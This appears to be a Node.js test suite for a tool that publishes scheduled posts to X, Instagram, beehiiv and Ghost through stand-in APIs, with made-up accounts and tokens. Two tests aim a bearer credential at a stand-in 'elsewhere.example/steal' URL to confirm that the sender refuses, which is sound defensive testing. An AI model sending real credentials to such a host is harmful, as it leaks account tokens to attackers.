// The sender against the records handed in and a stand-in place: a held value reaches only the place's own host and
// only as the request leaves, a destination whose outcome is not known is not sent again by itself, and nothing is sent
// twice. The run is handed the post and connection records and keeps nothing: the post as it ends comes back under `keep`,
// and these tests store it back into the records the next call is handed (`store`). Every account and value here is made up; no request
// leaves this computer.
import test from 'node:test';
import assert from 'node:assert/strict';
import rows from '../tool-rows.json' with { type: 'json' };
import places from '../read-data/post-places.json' with { type: 'json' };
import { createHmac } from 'node:crypto';
import { heldFetch, publisherFor, sendAPost as sendAPostRun } from '../read-data/send-a-post.mjs';
import { publishAPostNow as publishAPostNowRun } from '../read-data/posts.mjs';
import { approvalValues } from '../read-data/post-shape.mjs';
import { rowOf, rightsOf } from '../../../test-helpers/run-a-row.mjs';
import settings from '../read-data/posts.json' with { type: 'json' };
import { heldFields } from '../read-data/posts.mjs';
import { resolvedInvoke } from './by-input.mjs';
import { slugOf } from '../read-data/place-variants.mjs';

const VALUE = 'made-up-held-value-0123456789';
const ACCOUNT = 'service_connection:x:second';
const connection = { id: `connection:${encodeURIComponent(ACCOUNT)}`, type: 'connection', value: { connection_id: ACCOUNT, vendor: 'x', plain: { user_id: '1000000001' }, held: ['access_token'] } };
const post = fields => ({ id: 'post:p1', type: 'post', value: { post_id: 'post:p1', status: 'scheduled', caption: 'A short post', destinations: [ACCOUNT], approved_at: '2026-01-01T00:00:00Z', created_at: '2026-01-01T00:00:00Z', updated_at: '2026-01-01T00:00:00Z', scheduled_for: '2026-01-02T00:00:00Z', ...fields } });

// What the caller does with an answer: stores each row under `keep` into the records the run reads.
let store = null;
const keepInto = answer => { for (const row of answer.keep ?? []) store?.kept.set(row.id, { id: row.id, type: row.type, value: row.value }); return answer; };
const sendAPost = async (input, context) => keepInto(await sendAPostRun({ ...input, records: [...store.kept.values()] }, context));
const publishAPostNow = async input => keepInto(await publishAPostNowRun({ ...input, records: [...store.kept.values()] }));

// A stand-in for the place: answers a created post, and keeps every request it was sent.
function place(answer = { data: { id: '9001', text: 'A short post' } }) {
  const sent = [];
  const send = async (url, init) => {
    sent.push({ url, authorization: new Headers(init.headers).get('authorization'), body: init.body });
    return new Response(JSON.stringify(answer), { status: 201, headers: { 'content-type': 'application/json' } });
  };
  return { sent, send };
}

// The records the calls are handed, as the store holds them: `kept` is the store, written only by the caller.
async function withDoor(records, run) {
  const fake = { kept: new Map(records.map(row => [row.id, row])) };
  store = fake;
  return run(fake);
}

test('a post whose time has come is sent once to its destination, the held value only in the place\'s own request', async () => {
  const stand = place();
  await withDoor([post(), connection], async fake => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.equal(stand.sent.length, 1);
    assert.equal(new URL(stand.sent[0].url).hostname, 'api.x.com');
    assert.equal(stand.sent[0].authorization, `Bearer ${VALUE}`);
    const kept = fake.kept.get('post:p1').value;
    assert.equal(kept.status, 'posted');
    assert.equal(kept.deliveries[ACCOUNT].status, 'posted');
    assert.equal(kept.deliveries[ACCOUNT].platform_post_id, '9001');
    assert.ok(!JSON.stringify([...fake.kept.values()]).includes(VALUE), 'the held value is in no record');
    // Sending again sends nothing: the destination already has the post.
    const again = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.match(again.said, /already has the post/);
    assert.equal(stand.sent.length, 1);
  });
});

test('a send answers the post as it ends under keep, and stores nothing itself', async () => {
  const stand = place();
  await withDoor([post(), connection], async fake => {
    const answer = await sendAPostRun({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, records: [post(), connection] }, { send: stand.send, held: () => VALUE });
    assert.equal(answer.status, 'posted', answer.said);
    assert.equal(answer.keep.length, 1);
    assert.equal(answer.keep[0].id, 'post:p1');
    assert.equal(answer.keep[0].value.deliveries[ACCOUNT].platform_post_id, '9001');
    assert.equal(fake.kept.get('post:p1').value.status, 'scheduled', 'the stand-in records are as they were: the run stored nothing');
  });
});

test('publish now queues the post, and the timed send at its armed time sends it once through the place', async () => {
  const approved = post({ status: 'approved', scheduled_for: null });
  const reviewed = approvalValues(approved.value);
  const stand = place();
  await withDoor([approved, connection], async fake => {
    const queued = await publishAPostNow({ post_id: approved.id, expected_values: reviewed });
    assert.equal(queued.status, 'scheduled');
    assert.match(queued.said, /Queued for the send wake/);
    assert.equal(stand.sent.length, 0, 'queueing performs no publish request');
    const timed = { post_id: approved.id, place: 'x', account_id: ACCOUNT, armed_at: fake.kept.get(approved.id).value.armed_at };
    const sent = await sendAPost(timed, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.equal(stand.sent.length, 1);
    const readback = fake.kept.get(approved.id).value;
    assert.equal(readback.status, 'posted');
    assert.equal(readback.deliveries[ACCOUNT].status, 'posted');
    assert.equal(readback.deliveries[ACCOUNT].platform_post_id, '9001');
    const again = await sendAPost(timed, { send: stand.send, held: () => VALUE });
    assert.match(again.said, /already has the post/);
    assert.equal(stand.sent.length, 1);
    assert.equal(fake.kept.get(approved.id).value.deliveries[ACCOUNT].status, 'posted');
  });
});

test('publish now keeps an unknown destination outcome, and a timed send never sends it again', async () => {
  const approved = post({ status: 'approved', scheduled_for: null });
  const reviewed = approvalValues(approved.value);
  const stand = place({ data: {} });
  await withDoor([approved, connection], async fake => {
    const queued = await publishAPostNow({ post_id: approved.id, expected_values: reviewed });
    const timed = { post_id: approved.id, place: 'x', account_id: ACCOUNT, armed_at: fake.kept.get(approved.id).value.armed_at };
    const sent = await sendAPost(timed, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'partial');
    assert.match(sent.said, /not known/);
    assert.equal(stand.sent.length, 1);
    assert.equal(fake.kept.get(approved.id).value.deliveries[ACCOUNT].status, 'not known');
    const repeatSend = await sendAPost(timed, { send: stand.send, held: () => VALUE });
    assert.match(repeatSend.said, /not known/);
    assert.equal(stand.sent.length, 1, 'unknown outcome remains unresolved without a second request');
    assert.equal(queued.post.approved_at, approved.value.approved_at);
  });
});

test('nothing is sent before the post\'s time, for a draft, or to an account that is not its destination', async () => {
  const stand = place();
  await withDoor([post({ scheduled_for: '2099-01-01T00:00:00Z' }), connection], async () => {
    const early = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.match(early.said, /Its time has not come/);
  });
  await withDoor([post({ status: 'draft' }), connection], async () => {
    await assert.rejects(sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE }), /Only an approved post is sent/);
  });
  await withDoor([post(), connection], async () => {
    await assert.rejects(sendAPost({ post_id: 'post:p1', place: 'x', account_id: 'service_connection:x:other' }, { send: stand.send, held: () => VALUE }), /is not one of/);
  });
  assert.equal(stand.sent.length, 0);
});

test('a send whose outcome is not known is not sent again by itself, only with resend', async () => {
  const stand = place({ data: {} });
  await withDoor([post(), connection], async fake => {
    const first = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.equal(fake.kept.get('post:p1').value.deliveries[ACCOUNT].status, 'not known');
    assert.match(first.said, /not known/);
    const second = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.match(second.said, /not known/);
    assert.equal(stand.sent.length, 1);
    await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, resend: true }, { send: stand.send, held: () => VALUE });
    assert.equal(stand.sent.length, 2);
  });
});

// The address the caller made of the post's file where the person keeps it: one made-up picture, answered in pieces.
const PICTURE = new Uint8Array(Array.from({ length: 700 }, (_, at) => at % 251));
const SHARE_URL = 'https://files.example.test/bucket/people/p/files/sample-file?X-Amz-Signature=made-up';
function files({ gone = false, page = 256 } = {}) {
  const asked = [];
  const answer = async url => {
    asked.push(url);
    if (gone) return new Response('not found', { status: 404 });
    let at = 0;
    const body = new ReadableStream({ pull(controller) { if (at >= PICTURE.length) return controller.close(); controller.enqueue(PICTURE.slice(at, at + page)); at += page; } });
    return new Response(body, { status: 200, headers: { 'content-type': 'image/png', 'content-length': String(PICTURE.length) } });
  };
  return { asked, answer };
}
const pictured = post({ media: { identity: 'sample-file', name: '/Posts/a.png', media_type: 'image/png', byte_length: PICTURE.length } });

test('a place that takes a file only whole is handed its bytes, streamed from the address given', async () => {
  const stand = place({ data: { id: '9001', text: 'A short post', media_id_string: '7001', media_id: '7001' }, media_id_string: '7001' });
  const held = files({ page: 256 });
  await withDoor([pictured, connection], async () => {
    await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, media_url: SHARE_URL }, { fetchMedia: held.answer, send: stand.send, held: () => VALUE });
    assert.deepEqual(held.asked, [SHARE_URL]);
    assert.ok(stand.sent.every(request => new URL(request.url).hostname === 'api.x.com'), 'the file goes only to the place');
    const upload = stand.sent.find(request => request.body instanceof FormData || (request.body && typeof request.body.get === 'function'));
    assert.ok(upload, 'the picture was uploaded to the place');
    const sentBytes = new Uint8Array(await upload.body.get('media').arrayBuffer());
    assert.deepEqual(sentBytes, PICTURE);
  });
});

test('a place that fetches a file from an address is given the address, never the file', async () => {
  const instagram = 'service_connection:instagram:second';
  const record = { id: `connection:${encodeURIComponent(instagram)}`, type: 'connection', value: { connection_id: instagram, vendor: 'instagram', plain: { ig_user_id: '1000000002' }, held: ['access_token'] } };
  const stand = place({ id: '17890000000000001', status_code: 'FINISHED' });
  const held = files();
  await withDoor([post({ destinations: [instagram], media: { identity: 'sample-file', media_type: 'image/jpeg' } }), record], async () => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'instagram', account_id: instagram, media_url: SHARE_URL }, { fetchMedia: held.answer, send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.deepEqual(held.asked, [], 'the place fetches it; this run does not');
    assert.ok(stand.sent.length > 0);
    assert.ok(stand.sent.some(request => decodeURIComponent(`${request.url} ${request.body ?? ''}`).includes(SHARE_URL)), 'the place is handed the share');
    assert.ok(stand.sent.every(request => ['graph.instagram.com', 'graph.facebook.com'].includes(new URL(request.url).hostname)));
  });
});

test('a post whose file is gone, or that came with no address of its file, is refused before anything leaves, in plain words', async () => {
  const stand = place();
  await withDoor([pictured, connection], async fake => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, media_url: SHARE_URL }, { fetchMedia: files({ gone: true }).answer, send: stand.send, held: () => VALUE });
    assert.equal(stand.sent.length, 0);
    assert.equal(fake.kept.get('post:p1').value.deliveries[ACCOUNT].status, 'failed');
    assert.match(sent.said, /no longer in your files, so nothing was sent to X/);
    const unaddressed = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.equal(stand.sent.length, 0);
    assert.match(unaddressed.said, /no address of it was given, so nothing was sent to X/);
  });
});

test('a run told one place for another place\'s account sends nothing and writes nothing', async () => {
  const stand = place();
  await withDoor([post(), connection], async fake => {
    await assert.rejects(sendAPost({ post_id: 'post:p1', place: 'linkedin', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE }), /belongs to x, not linkedin/);
    await assert.rejects(sendAPost({ post_id: 'post:p1', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE }), /Give place/);
    assert.equal(stand.sent.length, 0);
    assert.equal(fake.kept.get('post:p1').value.deliveries, undefined, 'the post record was not written');
  });
});

test('a send handed no post record, or no connection record for its account, is refused and sends and keeps nothing', async () => {
  const stand = place();
  await assert.rejects(sendAPostRun({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, records: [connection] }, { send: stand.send, held: () => VALUE }), /There is no post post:p1 among the records handed in/);
  await assert.rejects(sendAPostRun({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, records: [post()] }, { send: stand.send, held: () => VALUE }), /has no connection record among the records handed in/);
  assert.equal(stand.sent.length, 0);
  const kept = await sendAPostRun({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, records: [post(), connection] }, { send: stand.send, held: () => VALUE });
  assert.equal(kept.keep[0].value.deliveries[ACCOUNT].status, 'posted', 'the same post sends once its connection is handed in');
});

test('the send row reads the person\'s files only by read_file_span, and no other files operation', () => {
  const row = rowOf(rows, 'tool:send-a-post');
  assert.deepEqual(rightsOf(row).filter(right => 'files' in right), [{ files: '/', operations: ['read_file_span'] }]);
  assert.doesNotMatch(JSON.stringify(row), /records:(read|write|list)/, 'the send row declares no records door right');
  assert.equal(row.input_schema.properties.media_url.type, 'string');
});

test('a held value never goes to a host the place does not list, and a redirect carrying one is not followed', async () => {
  const standIns = new Map([['held-mark', () => VALUE]]);
  const seen = [];
  const fetchHeld = heldFetch({ standIns, hosts: ['api.x.com'], send: async (url, init) => { seen.push({ url, init }); return new Response('{}'); } });
  await assert.rejects(fetchHeld('https://elsewhere.example/steal', { headers: { authorization: 'Bearer held-mark' } }), /goes only to api\.x\.com/);
  await fetchHeld('https://api.x.com/2/tweets', { method: 'POST', headers: { authorization: 'Bearer held-mark' } });
  assert.equal(seen.length, 1);
  assert.equal(new Headers(seen[0].init.headers).get('authorization'), `Bearer ${VALUE}`);
  assert.equal(seen[0].init.redirect, 'manual');
});

test('each place\'s run is handed the connection kind, the renewal and the held fields its place row declares, in the order the sender reads them, and no tool id names a vendor', () => {
  const send = rowOf(rows, 'tool:send-a-post');
  assert.deepEqual(Object.keys(send.invoke.by_input.variants).sort(), places.places.map(slugOf).sort(), 'every place has its variant, and only places');
  assert.equal(send.invoke.internet, true);
  for (const placed of places.places) {
    const invoke = resolvedInvoke(send, { place: slugOf(placed) });
    assert.deepEqual(invoke.connection, { vendor: placed.connection_vendor, from_input: 'account_id' }, slugOf(placed));
    assert.deepEqual(invoke.credential_mounts, heldFields(placed.options).map((field, at) => ({ field_id: field, fd: 4 + at })), slugOf(placed));
    assert.deepEqual(invoke.refresh, placed.refresh, slugOf(placed));
  }
  for (const row of rows.records.map(record => record.payload).filter(payload => payload.invoke.by_input)) {
    const words = row.id.split(/[:-]/);
    for (const placed of places.places) assert.ok(!words.includes(placed.connection_vendor) && !words.includes(slugOf(placed)), `${row.id} names no vendor`);
  }
  assert.ok(!rows.records.some(record => /^tool:(send-a-post-to-|check-the-.+-connection$)/.test(record.payload.id)), 'no tool is named for one place');
});

// A post set to go at its time is sent then through the person's own wake: a change to their posts answers one timed
// run of the place's send row per destination, and that run sends only while the post carries the armed_at it was
// set with. The wake's cause is made up the way the engine hands one (task.cause.detail.changes).
const ARMED = '2026-01-01T00:00:05.000Z';
const armed = fields => post({ armed_at: ARMED, ...fields });
test('a timed send set before the post was taken back, changed or set again sends nothing; one for its time sends', async () => {
  const stand = place();
  for (const [label, record] of [['set again', armed({ armed_at: '2026-01-01T09:00:00.000Z' })], ['taken back', armed({ status: 'draft' })], ['changed and approved again', armed({ status: 'approved' })]]) {
    await withDoor([record, connection], async fake => {
      const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, armed_at: ARMED }, { send: stand.send, held: () => VALUE });
      assert.equal(sent.said, settings.at_its_time.words.no_longer_set, label);
      assert.deepEqual(fake.kept.get('post:p1').value, record.value, `${label}: nothing was written`);
    });
  }
  await withDoor([connection], async () => {
    await assert.rejects(sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, armed_at: ARMED }, { send: stand.send, held: () => VALUE }), /There is no post post:p1/);
  });
  assert.equal(stand.sent.length, 0);
  await withDoor([armed(), connection], async () => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, armed_at: ARMED }, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
  });
  assert.equal(stand.sent.length, 1);
});

// Newsletter places written as requests in their place rows (adapter requests): beehiiv and Ghost, against stand-ins
// that answer as each place's API does. Every key, publication and site here is made up.
const BEEHIIV = 'service_connection:beehiiv:second';
const GHOST = 'service_connection:ghost:second';
const SITE = 'https://site.example.test';
const GHOST_KEY = `made-up-key-id:${'ab'.repeat(32)}`;
const newsletter = [
  { id: `connection:${encodeURIComponent(BEEHIIV)}`, type: 'connection', value: { connection_id: BEEHIIV, vendor: 'beehiiv', plain: { publication_id: 'pub_made_up' }, held: ['api_key'] } },
  { id: `connection:${encodeURIComponent(GHOST)}`, type: 'connection', value: { connection_id: GHOST, vendor: 'ghost', plain: { site_url: SITE }, held: ['admin_api_key'] } },
];
const letter = fields => post({ caption: '## A heading\n\nA **short** letter with [a link](https://example.test/a?b=1&c=2).', settings_by_platform: { beehiiv: { title: 'A letter' }, ghost: { title: 'A letter', excerpt: 'In short' } }, ...fields });

// A stand-in place that keeps what it was asked and answers each request by its method.
function api(answers) {
  const asked = [];
  const send = async (url, init) => {
    asked.push({ url, method: init.method, authorization: new Headers(init.headers).get('authorization'), body: init.body ? JSON.parse(init.body) : null });
    return new Response(JSON.stringify(answers[init.method]), { status: init.method === 'POST' ? 201 : 200, headers: { 'content-type': 'application/json' } });
  };
  return { asked, send };
}

test('a post goes to beehiiv as the place row writes it: made with its title and HTML words, then read back', async () => {
  const stand = api({ POST: { data: { id: 'post_made_up' } }, GET: { data: { id: 'post_made_up', web_url: 'https://letters.example.test/p/a-letter' } } });
  await withDoor([letter({ destinations: [BEEHIIV] }), ...newsletter], async fake => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'beehiiv', account_id: BEEHIIV }, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.deepEqual(stand.asked.map(item => [item.method, item.url]), [['POST', 'https://api.beehiiv.com/v2/publications/pub_made_up/posts'], ['GET', 'https://api.beehiiv.com/v2/publications/pub_made_up/posts/post_made_up']]);
    assert.ok(stand.asked.every(item => item.authorization === `Bearer ${VALUE}`));
    const body = stand.asked[0].body;
    assert.equal(body.title, 'A letter');
    assert.equal(body.status, 'confirmed');
    assert.ok(!('subtitle' in body), 'a setting the post leaves out is left out');
    assert.equal(body.body_html, '<h2>A heading</h2><p>A <strong>short</strong> letter with <a href="https://example.test/a?b=1&amp;c=2&amp;utm_source=beehiiv&amp;utm_medium=social&amp;utm_content=post%3Ap1%3A%3Aservice_connection%3Abeehiiv%3Asecond&amp;utm_campaign=post%3Ap1">a link</a>.</p>');
    const kept = fake.kept.get('post:p1').value.deliveries[BEEHIIV];
    assert.equal(kept.url, 'https://letters.example.test/p/a-letter');
    assert.equal(kept.platform_post_id, 'post_made_up');
    assert.ok(!JSON.stringify([...fake.kept.values()]).includes(VALUE), 'the held value is in no record');
  });
});

test('a post goes to Ghost with a five-minute token made from the held key as the request leaves, never the key', async () => {
  const stand = api({ POST: { posts: [{ id: 'ghost_made_up' }] }, GET: { posts: [{ id: 'ghost_made_up', url: `${SITE}/a-letter/` }] } });
  await withDoor([letter({ destinations: [GHOST] }), ...newsletter], async fake => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'ghost', account_id: GHOST }, { send: stand.send, held: () => GHOST_KEY });
    assert.equal(sent.status, 'posted', sent.said);
    assert.deepEqual(stand.asked.map(item => [item.method, item.url]), [['POST', `${SITE}/ghost/api/admin/posts/?source=html`], ['GET', `${SITE}/ghost/api/admin/posts/ghost_made_up/?formats=html`]]);
    const [made] = stand.asked[0].body.posts;
    assert.deepEqual({ title: made.title, status: made.status, custom_excerpt: made.custom_excerpt }, { title: 'A letter', status: 'published', custom_excerpt: 'In short' });
    for (const { authorization } of stand.asked) {
      const [scheme, token] = authorization.split(' ');
      assert.equal(scheme, 'Ghost');
      assert.ok(!authorization.includes(GHOST_KEY.split(':')[1]), 'the secret never leaves');
      const [header, claims, signature] = token.split('.');
      const read = part => JSON.parse(Buffer.from(part, 'base64url').toString());
      assert.deepEqual(read(header), { alg: 'HS256', typ: 'JWT', kid: 'made-up-key-id' });
      assert.equal(read(claims).aud, '/admin/');
      assert.equal(read(claims).exp - read(claims).iat, 300);
      assert.equal(signature, createHmac('sha256', Buffer.from('ab'.repeat(32), 'hex')).update(`${header}.${claims}`).digest('base64url'));
    }
    assert.equal(fake.kept.get('post:p1').value.deliveries[GHOST].url, `${SITE}/a-letter/`);
    assert.ok(!JSON.stringify([...fake.kept.values()]).includes(GHOST_KEY), 'the held key is in no record');
  });
});

test('a newsletter place that does not confirm the post it made leaves the send not known, and its key goes only to its own host', async () => {
  const unconfirmed = api({ POST: { data: { id: 'post_made_up' } }, GET: { data: { id: 'another_post' } } });
  await withDoor([letter({ destinations: [BEEHIIV] }), ...newsletter], async fake => {
    await sendAPost({ post_id: 'post:p1', place: 'beehiiv', account_id: BEEHIIV }, { send: unconfirmed.send, held: () => VALUE });
    assert.equal(fake.kept.get('post:p1').value.deliveries[BEEHIIV].status, 'not known');
  });
  const elsewhere = { ...newsletter[1], value: { ...newsletter[1].value, plain: { site_url: SITE } } };
  const ghostRow = places.places.find(item => item.platform === 'ghost');
  const misplaced = { ...ghostRow, options: { ...ghostRow.options, steps: ghostRow.options.steps.map(step => ({ ...step, url: 'https://elsewhere.example/steal' })) } };
  const stand = api({ POST: { posts: [{ id: 'x' }] }, GET: { posts: [{ id: 'x' }] } });
  const { social, account } = publisherFor(misplaced, elsewhere.value, { held: () => GHOST_KEY, send: stand.send });
  const refused = await social.posts.publish({ targets: [{ account, options: { title: 'A letter' } }], content: { text: 'Words' }, idempotencyKey: 'k' }).catch(error => ({ error }));
  assert.equal(refused.outcomes[0].state, 'failed', 'refused before sending, so it failed: it is not a send whose outcome is not known');
  assert.match(JSON.stringify(refused.outcomes[0]), /goes only to site\.example\.test/);
  assert.equal(stand.asked.length, 0);
});

test('each newsletter place has its send variant, mounting the one key its requests sign with', () => {
  for (const [platform, field] of [['beehiiv', 'api_key'], ['ghost', 'admin_api_key']]) {
    const placed = places.places.find(item => item.platform === platform);
    assert.equal(placed.adapter, 'requests');
    assert.ok(placed.media_from, `${platform} says how a file reaches it`);
    assert.deepEqual(heldFields(placed.options), [field]);
    const invoke = resolvedInvoke(rowOf(rows, 'tool:send-a-post'), { place: slugOf(placed) });
    assert.deepEqual(invoke.credential_mounts, [{ field_id: field, fd: 4 }]);
    assert.equal(invoke.connection.vendor, placed.connection_vendor);
  }
});

// A made-up place whose publisher makes two requests, each signed with the same held key: the run's held value comes on
// descriptor 4, as the engine hands it, so it is read there in a run of its own.
const TWO_SIGNED = {
  platform: 'made-up-letters', label: 'Made-up letters', adapter: 'requests', connection_vendor: 'made-up-letters', hosts: ['api.letters.example.test'],
  account: { plain: 'publication_id' },
  options: {
    platform: 'made-up-letters', account: { plain: 'publication_id' },
    steps: [
      { id: 'created', operation: 'letters.create', method: 'POST', url: { join: ['https://api.letters.example.test/v1/', { plain: 'publication_id' }, '/posts'] },
        headers: { authorization: { join: ['Bearer ', { held: 'api_key' }] } }, body: { body_html: { post: 'words', markup: 'html' } }, goes_public: true, needs: ['data.id'] },
      { id: 'read', operation: 'letters.read', url: { join: ['https://api.letters.example.test/v1/', { plain: 'publication_id' }, '/posts/', { step: 'created', at: 'data.id' }] },
        headers: { authorization: { join: ['Bearer ', { held: 'api_key' }] } } },
    ],
    post_id: { step: 'created', at: 'data.id' },
  },
};
const TWO_SIGNED_RUN = `
import { connectedAccountRef } from '@opencoredev/social-sdk';
import { heldFromDescriptors, publisherFor } from ${JSON.stringify(new URL('../read-data/send-a-post.mjs', import.meta.url).href)};
const place = ${JSON.stringify(TWO_SIGNED)};
const asked = [];
const send = async (url, init) => {
  asked.push(new Headers(init.headers).get('authorization'));
  return new Response(JSON.stringify({ data: { id: 'letter_made_up' } }), { status: 200, headers: { 'content-type': 'application/json' } });
};
const { social, account } = publisherFor(place, { plain: { publication_id: 'pub_made_up' } }, { held: heldFromDescriptors(place), send });
const result = await social.posts.publish({ targets: [{ account }], content: { text: 'A short letter' }, idempotencyKey: 'two-signed' });
console.log(JSON.stringify({ asked, state: result.outcomes[0].state }));
`;

test('a place that signs two requests in one run sends the held key on both, read from its descriptor once', async () => {
  const { spawn } = await import('node:child_process');
  const child = spawn(process.execPath, ['--input-type=module', '-e', TWO_SIGNED_RUN], { cwd: new URL('..', import.meta.url), stdio: ['ignore', 'pipe', 'pipe', 'ignore', 'pipe'] });
  child.stdio[4].on('error', () => {});
  child.stdio[4].end(VALUE);
  let out = '', err = '';
  child.stdout.on('data', chunk => { out += chunk; });
  child.stderr.on('data', chunk => { err += chunk; });
  const code = await new Promise(done => child.on('close', done));
  assert.equal(code, 0, err);
  const ran = JSON.parse(out.trim().split('\n').at(-1));
  assert.deepEqual(ran.asked, [`Bearer ${VALUE}`, `Bearer ${VALUE}`]);
  assert.equal(ran.state, 'published');
});
test('a thread part is sent as a reply to the part before it, its id in the place\'s request and nowhere else', async () => {
  const stand = place();
  await withDoor([post(), connection], async fake => {
    const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, reply_to: '8000' }, { send: stand.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.equal(stand.sent.length, 1);
    assert.equal(JSON.parse(stand.sent[0].body).reply.in_reply_to_tweet_id, '8000');
    assert.equal(fake.kept.get('post:p1').value.deliveries[ACCOUNT].platform_post_id, '9001');
    assert.ok(!JSON.stringify([...fake.kept.values()]).includes(VALUE), 'the held value is in no record');
  });
});

test('a send without reply_to carries no reply, and a reply_to that is not a post id is refused before anything is sent', async () => {
  const stand = place();
  await withDoor([post(), connection], async () => {
    await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: stand.send, held: () => VALUE });
    assert.equal(JSON.parse(stand.sent[0].body).reply, undefined, 'no reply field without reply_to');
  });
  const none = place();
  await withDoor([post(), connection], async () => {
    await assert.rejects(sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, reply_to: '  ' }, { send: none.send, held: () => VALUE }), /reply_to/);
    assert.equal(none.sent.length, 0, 'nothing was sent');
  });
});

test('a send the place refuses for its credits waits with the reason, stays queued, and goes on the next send once they return', async () => {
  const refused = [];
  const out = async (url, init) => { refused.push(url); return new Response(JSON.stringify({ title: 'Payment Required', detail: 'Your account has run out of credits' }), { status: 402, headers: { 'content-type': 'application/json' } }); };
  await withDoor([post(), connection], async fake => {
    const waiting = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: out, held: () => VALUE });
    assert.equal(refused.length, 1);
    assert.equal(fake.kept.get('post:p1').value.deliveries[ACCOUNT].status, 'waiting', waiting.said);
    assert.match(fake.kept.get('post:p1').value.deliveries[ACCOUNT].error, /credits/);
    assert.equal(fake.kept.get('post:p1').value.status, 'scheduled', 'the post stays queued');
    const back = place();
    const sent = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT }, { send: back.send, held: () => VALUE });
    assert.equal(sent.status, 'posted', sent.said);
    assert.equal(back.sent.length, 1, 'the next send goes once');
  });
});

test('a post\'s own file is read from the Files right in spans of at most 192 KB, and nothing is read for a name the post does not list', async () => {
  const size = 400000;
  const clip = new Uint8Array(size).map((_, i) => i % 251);
  const calls = [];
  const files = async (method, input) => {
    calls.push({ method, ...input });
    const bytes = clip.subarray(input.offset, input.offset + input.length);
    return { bytes_returned: bytes.length, encoding: 'base64', content: Buffer.from(bytes).toString('base64') };
  };
  const video = { media: { name: '/Recordings/clip.mp4', media_type: 'video/mp4', byte_length: size, identity: `1f:${'a'.repeat(64)}` } };
  await withDoor([post(video), connection], async () => {
    await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, media_name: '/Recordings/clip.mp4' }, { send: place().send, held: () => VALUE, files });
  });
  assert.deepEqual(calls.map(call => [call.method, call.name_or_identity, call.offset, call.length]), [
    ['read_file_span', '/Recordings/clip.mp4', 0, 196608],
    ['read_file_span', '/Recordings/clip.mp4', 196608, 196608],
    ['read_file_span', '/Recordings/clip.mp4', 393216, 6784]]);
  const other = [];
  await withDoor([post(video), connection], async fake => {
    const refused = await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, media_name: '/Private/other.mp4' }, { send: place().send, held: () => VALUE, files: async () => other.push(1) });
    assert.equal(other.length, 0, 'no read for a name the post does not list');
    assert.equal(fake.kept.get('post:p1').value.deliveries[ACCOUNT].status, 'failed');
    assert.match(fake.kept.get('post:p1').value.deliveries[ACCOUNT].error, /not one of the post's own files/, refused.said);
  });
});

test('a post\'s file from the Files right is refused in plain words when the run was not handed the right', async () => {
  const video = { media: { name: '/Recordings/clip.mp4', media_type: 'video/mp4', byte_length: 1000, identity: `1f:${'b'.repeat(64)}` } };
  await withDoor([post(video), connection], async fake => {
    await sendAPost({ post_id: 'post:p1', place: 'x', account_id: ACCOUNT, media_name: '/Recordings/clip.mp4' }, { send: place().send, held: () => VALUE });
    assert.match(fake.kept.get('post:p1').value.deliveries[ACCOUNT].error, /not handed the right to read your files/);
  });
});
